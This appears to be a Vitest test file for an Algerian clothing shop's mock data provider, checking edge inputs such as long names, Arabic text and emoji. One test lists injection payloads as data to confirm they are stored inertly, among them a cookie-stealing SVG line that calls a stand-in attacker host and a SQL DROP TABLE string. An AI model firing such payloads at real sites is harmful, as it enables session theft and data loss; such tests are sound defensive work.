import { describe, it, expect, beforeEach } from 'vitest';
import { mockDataProvider } from '../helpers/mockDataProvider';
import { calculateSubtotal, calculateTotal, isValidAlgerianPhone } from '../helpers/testUtils';
import { Product, Order } from '../fixtures/types';

describe('Tier 2: Boundary & Corner Cases — Edge Inputs (edge-inputs.test.ts)', () => {
  beforeEach(() => {
    mockDataProvider.reset();
  });

  // ==========================================
  // 1. Extreme String Lengths
  // ==========================================
  it('handles boundary string lengths: 1-character, 255-character, and 5,000-character customer names and notes', async () => {
    const singleCharName = 'A';
    const longString255 = 'M'.repeat(255);
    const extremeNotes = 'LIVRAISON_URGENTE_'.repeat(300); // ~5400 characters

    const order = await mockDataProvider.createOrder({
      customer: {
        fullName: singleCharName,
        phone: '0550123456',
        wilaya: 'Alger',
        wilayaCode: 16,
        commune: 'Hydra',
        address: 'Villa 12, Rue des Palmiers',
        notes: extremeNotes,
      },
      items: [
        {
          productId: 'prod-001',
          title: 'Costume Laine Super 130s',
          slug: 'costume-laine-super-130s',
          price: 48500,
          quantity: 1,
          selectedSize: '50',
          image: 'https://images.unsplash.com/photo-1594938298603-c8148c4dae35',
        },
      ],
      deliveryFee: 400,
    });

    expect(order.id).toBeDefined();
    expect(order.customer.fullName).toBe('A');
    expect(order.customer.notes).toHaveLength(extremeNotes.length);

    // Update with 255-char name
    const order2 = await mockDataProvider.createOrder({
      customer: {
        fullName: longString255,
        phone: '0661234567',
        wilaya: 'Oran',
        wilayaCode: 31,
        commune: 'Akid Lotfi',
        address: 'Résidence El Bahia',
      },
      items: [
        {
          productId: 'prod-002',
          title: 'Blazer Velours',
          slug: 'blazer-velours',
          price: 32000,
          quantity: 1,
          selectedSize: '52',
          image: 'https://images.unsplash.com/photo-1507679799987-c73779587ccf',
        },
      ],
      deliveryFee: 600,
    });

    expect(order2.customer.fullName).toBe(longString255);
    expect(order2.customer.fullName.length).toBe(255);
  });

  // ==========================================
  // 2. HTML & Script Injection Payloads (XSS & Fuzz Vectors)
  // ==========================================
  it('safely encapsulates HTML and script injection attempts in customer fields and product titles', async () => {
    const maliciousScripts = [
      "<script>alert('XSS-INJECTION')</script>",
      "<img src=x onerror=alert('document.cookie') />",
      "<svg/onload=fetch('http://attacker.com?c='+document.cookie)>",
      "javascript:alert(1)",
      "'; DROP TABLE orders; --",
      "{{7*7}}",
      "${process.exit(1)}",
    ];

    for (const payload of maliciousScripts) {
      // 1. In Order customer notes & commune
      const order = await mockDataProvider.createOrder({
        customer: {
          fullName: `Client ${payload}`,
          phone: '0770123456',
          wilaya: 'Constantine',
          wilayaCode: 25,
          commune: payload,
          address: `Cité des Martyrs ${payload}`,
          notes: payload,
        },
        items: [
          {
            productId: 'prod-003',
            title: 'Chemise Popeline Blanche',
            slug: 'chemise-popeline-blanche',
            price: 8500,
            quantity: 1,
            selectedSize: '40',
            image: 'https://images.unsplash.com/photo-1602810318383-e386cc2a3ccf',
          },
        ],
        deliveryFee: 600,
      });

      // Data store treats payload strictly as textual data without executing or corrupting
      expect(order.customer.fullName).toContain(payload);
      expect(order.customer.commune).toBe(payload);
      expect(order.customer.notes).toBe(payload);

      // Search matching by exact payload text works safely
      const matchingOrders = await mockDataProvider.getOrders({ search: payload });
      expect(matchingOrders.length).toBeGreaterThanOrEqual(1);
    }
  });

  // ==========================================
  // 3. Multilingual Characters & Accents (Arabic, French, Tamazight)
  // ==========================================
  it('correctly preserves Arabic, French accents, and Latin characters in product creation and filtering', async () => {
    const arabicTitle = 'بدلة رجالية فاخرة من الصوف الإيطالي';
    const arabicCommune = 'الجزائر الوسطى - باب الوادي';
    const frenchTitle = 'Costume Sur-Mesure Laine d\'Été & Soie Écru - Prêt-à-Porter';

    const createdProduct = await mockDataProvider.createProduct({
      title: frenchTitle,
      slug: 'costume-sur-mesure-laine-ete-soie-ecru',
      description: 'Pièce maîtresse confectionnée à Naples. Finition surpiquée à la main.',
      price: 54000,
      categoryId: 'clothing',
      categorySlug: 'vetements',
      subcategory: 'costumes',
      images: [
        {
          id: 'img-fr-1',
          url: 'https://images.unsplash.com/photo-1594938298603-c8148c4dae35',
          alt: 'Costume Laine d\'Été',
          isPrimary: true,
        },
      ],
      sizes: ['48', '50', '52'],
      stockQuantity: 5,
      inStock: true,
      isFeatured: true,
      isNewArrival: true,
    });

    expect(createdProduct.title).toBe(frenchTitle);

    // Search by accented word "Été"
    const resultsAccented = await mockDataProvider.getProducts({ search: 'Été' });
    expect(resultsAccented.some((p) => p.id === createdProduct.id)).toBe(true);

    // Order with Arabic text
    const arabicOrder = await mockDataProvider.createOrder({
      customer: {
        fullName: 'أحمد بن علي',
        phone: '0551234567',
        wilaya: 'Alger',
        wilayaCode: 16,
        commune: arabicCommune,
        address: 'نهج ديدوش مراد رقم 45',
        notes: 'يرجى الاتصال قبل التسليم بنصف ساعة',
      },
      items: [
        {
          productId: createdProduct.id,
          title: createdProduct.title,
          slug: createdProduct.slug,
          price: createdProduct.price,
          quantity: 1,
          selectedSize: '50',
          image: createdProduct.images[0].url,
        },
      ],
      deliveryFee: 400,
    });

    expect(arabicOrder.customer.fullName).toBe('أحمد بن علي');
    expect(arabicOrder.customer.commune).toBe(arabicCommune);
    expect(arabicOrder.customer.notes).toContain('يرجى الاتصال');
  });

  // ==========================================
  // 4. Empty Strings, All-Whitespace, and Missing Optional Fields
  // ==========================================
  it('correctly handles empty strings, leading/trailing whitespace, and optional notes', async () => {
    const rawName = '   Karim Brahimi   ';
    const trimmedExpected = rawName.trim();

    const order = await mockDataProvider.createOrder({
      customer: {
        fullName: rawName.trim(),
        phone: '0770998877',
        wilaya: 'Blida',
        wilayaCode: 9,
        commune: '   Boufarik   '.trim(),
        address: 'Rue de la Gare',
        // notes explicitly omitted
      },
      items: [
        {
          productId: 'prod-001',
          title: 'Costume',
          slug: 'costume',
          price: 48500,
          quantity: 1,
          selectedSize: '50',
          image: 'https://example.com/img.jpg',
        },
      ],
      deliveryFee: 500,
    });

    expect(order.customer.fullName).toBe(trimmedExpected);
    expect(order.customer.commune).toBe('Boufarik');
    expect(order.customer.notes).toBeUndefined();

    // Empty search query returns all products without crash
    const allProducts = await mockDataProvider.getProducts({ search: '' });
    expect(allProducts.length).toBeGreaterThanOrEqual(18);

    const whitespaceSearch = await mockDataProvider.getProducts({ search: '    ' });
    expect(whitespaceSearch.length).toBeGreaterThanOrEqual(18);
  });

  // ==========================================
  // 5. Special Characters, Emojis, and Punctuation in Metadata
  // ==========================================
  it('handles emoji symbols, quotes, and punctuation in product metadata and customer fields', async () => {
    const emojiTitle = 'Montre Chronographe Or Rose 18k ⌚️ VIP TADJ Exclusive ✨';
    const notesWithSpecialChars = 'Interphone: #402 / Code porte: *9912# / Attention au chien 🐕 / État: "Neuf & Scellé"';

    const product = await mockDataProvider.createProduct({
      title: emojiTitle,
      slug: 'montre-chronographe-or-rose-18k-vip-tadj',
      description: 'Édition limitée & numérotée. Verre saphir inrayable.',
      price: 185000,
      categoryId: 'accessories',
      categorySlug: 'accessoires',
      subcategory: 'montres',
      images: [
        {
          id: 'watch-emoji-1',
          url: 'https://images.unsplash.com/photo-1522335789203-aabd1fc54bc9',
          alt: 'Montre VIP ⌚️',
          isPrimary: true,
        },
      ],
      sizes: ['Unique'],
      stockQuantity: 2,
      inStock: true,
      isFeatured: true,
      isNewArrival: true,
    });

    expect(product.title).toBe(emojiTitle);

    const order = await mockDataProvider.createOrder({
      customer: {
        fullName: 'Yacine Belhadj',
        phone: '0660112233',
        wilaya: 'Annaba',
        wilayaCode: 23,
        commune: 'Sidi Amar',
        address: 'Bâtiment C, Entrée 2',
        notes: notesWithSpecialChars,
      },
      items: [
        {
          productId: product.id,
          title: product.title,
          slug: product.slug,
          price: product.price,
          quantity: 1,
          selectedSize: 'Unique',
          image: product.images[0].url,
        },
      ],
      deliveryFee: 600,
    });

    expect(order.customer.notes).toBe(notesWithSpecialChars);
    expect(order.items[0].title).toContain('⌚️');
  });
});
